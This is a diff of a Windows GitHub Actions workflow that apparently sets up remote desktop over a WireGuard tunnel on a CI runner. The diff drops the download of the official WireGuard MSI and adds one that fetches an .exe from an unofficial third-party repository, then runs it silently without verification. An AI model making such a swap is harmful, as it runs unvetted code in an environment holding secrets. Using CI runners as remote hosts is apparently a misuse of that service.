@@ -15,56 +15,33 @@ jobs:
           Invoke-WebRequest https://raw.githubusercontent.com/arifkembiri/RDP-Windows-2022-Tailscale/refs/heads/main/wallpaper.bat -OutFile wallpaper.bat
           Invoke-WebRequest https://raw.githubusercontent.com/arifkembiri/RDP-Windows-2022-Tailscale/refs/heads/main/loop.bat -OutFile loop.bat
 
+      - name: Download WireGuard Installer
+        shell: pwsh
+        run: |
+          Write-Output "Downloading WireGuard installer from alternate source..."
+          $installerUrl = "https://raw.githubusercontent.com/nicklasxyz/wireguard-windows-installer/main/wireguard-installer.exe"
+          $installerPath = "$env:TEMP\wireguard-installer.exe"
+          
+          try {
+            Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -TimeoutSec 120
+            Write-Output "Download completed!"
+          } catch {
+            Write-Error "Failed to download WireGuard: $_"
+            exit 1
+          }
+
       - name: Install WireGuard
         shell: pwsh
         run: |
-          Write-Output "Getting latest WireGuard download URL..."
-          $apiUrl = "https://api.github.com/repos/WireGuard/wireguard-windows/releases/latest"
-          $release = Invoke-RestMethod -Uri $apiUrl
-          $asset = $release.assets | Where-Object { $_.name -like "*amd64*.msi" -or $_.name -like "*x86_64*.msi" } | Select-Object -First 1
-          
-          if (-not $asset) {
-            Write-Error "Could not find WireGuard MSI installer"
-            exit 1
-          }
-          
-          $installerUrl = $asset.browser_download_url
-          Write-Output "Downloading WireGuard from: $installerUrl"
-          
-          $installerPath = "$env:TEMP\wireguard-installer.msi"
-          
-          # دانلود با قابلیت ردگیری پیشرفت
-          $ProgressPreference = 'SilentlyContinue'
-          Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath -TimeoutSec 180
-          $ProgressPreference = 'Continue'
-          
+          $installerPath = "$env:TEMP\wireguard-installer.exe"
           Write-Output "Installing WireGuard..."
-          Start-Process msiexec.exe -ArgumentList "/i `"$installerPath`" /quiet /norestart DO_NOT_LAUNCH=1" -Wait
+          Start-Process -FilePath $installerPath -ArgumentList "/S" -Wait
+          Start-Sleep -Seconds 15
           
-          Start-Sleep -Seconds 10
-          
-          # بررسی مسیرهای مختلف نصب
-          $possiblePaths = @(
-            "C:\Program Files\WireGuard\wireguard.exe",
-            "${env:ProgramFiles(x86)}\WireGuard\wireguard.exe",
-            "C:\Program Files\WireGuard\wg.exe",
-            "${env:ProgramFiles(x86)}\WireGuard\wg.exe"
-          )
-          
-          $found = $false
-          foreach ($path in $possiblePaths) {
-            if (Test-Path $path) {
-              Write-Output "WireGuard found at: $path"
-              $found = $true
-              break
-            }
-          }
-          
-          if (-not $found) {
+          if (Test-Path "C:\Program Files\WireGuard\wireguard.exe") {
+            Write-Output "WireGuard installed successfully!"
+          } else {
             Write-Error "WireGuard installation failed!"
-            Write-Output "Searching for WireGuard files..."
-            Get-ChildItem "C:\Program Files" -Recurse -Filter "wireguard*" -ErrorAction SilentlyContinue
-            Get-ChildItem "${env:ProgramFiles(x86)}" -Recurse -Filter "wireguard*" -ErrorAction SilentlyContinue
             exit 1
           }
 
@@ -76,26 +53,12 @@ jobs:
           WIREGUARD_PEER_PUBLIC_KEY: ${{ secrets.WIREGUARD_PEER_PUBLIC_KEY }}
           WIREGUARD_ENDPOINT: ${{ secrets.WIREGUARD_ENDPOINT }}
         run: |
-          # پیدا کردن مسیر wireguard.exe
-          $wgExe = Get-ChildItem "C:\Program Files" -Recurse -Filter "wireguard.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-          if (-not $wgExe) {
-            $wgExe = Get-ChildItem "${env:ProgramFiles(x86)}" -Recurse -Filter "wireguard.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-          }
-          
-          if (-not $wgExe) {
-            Write-Error "wireguard.exe not found!"
-            exit 1
-          }
-          
-          $wgPath = $wgExe.FullName
-          Write-Output "Using WireGuard at: $wgPath"
-          
           $configPath = "$env:TEMP\wg0.conf"
           $configContent = "[Interface]`nPrivateKey = $env:WIREGUARD_PRIVATE_KEY`nAddress = $env:WIREGUARD_ADDRESS`nDNS = 1.1.1.1`n`n[Peer]`nPublicKey = $env:WIREGUARD_PEER_PUBLIC_KEY`nEndpoint = $env:WIREGUARD_ENDPOINT`nAllowedIPs = 0.0.0.0/0`nPersistentKeepalive = 25"
           $configContent | Out-File -FilePath $configPath -Encoding ascii
           
           Write-Output "Starting WireGuard tunnel..."
-          & $wgPath /installtunnelservice $configPath
+          & "C:\Program Files\WireGuard\wireguard.exe" /installtunnelservice $configPath
           Start-Sleep -Seconds 5
           Write-Output "WireGuard tunnel connected successfully!"
 
@@ -124,14 +87,7 @@ jobs:
         if: always()
         shell: pwsh
         run: |
-          $wgExe = Get-ChildItem "C:\Program Files" -Recurse -Filter "wireguard.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-          if (-not $wgExe) {
-            $wgExe = Get-ChildItem "${env:ProgramFiles(x86)}" -Recurse -Filter "wireguard.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
-          }
-          
-          if ($wgExe) {
-            & $wgExe.FullName /uninstalltunnelservice wg0
-            Write-Output "WireGuard tunnel removed."
-          } else {
-            Write-Output "WireGuard not found, skipping cleanup."
+          if (Test-Path "C:\Program Files\WireGuard\wireguard.exe") {
+            & "C:\Program Files\WireGuard\wireguard.exe" /uninstalltunnelservice wg0
+            Write-Output "Cleanup completed."
           }
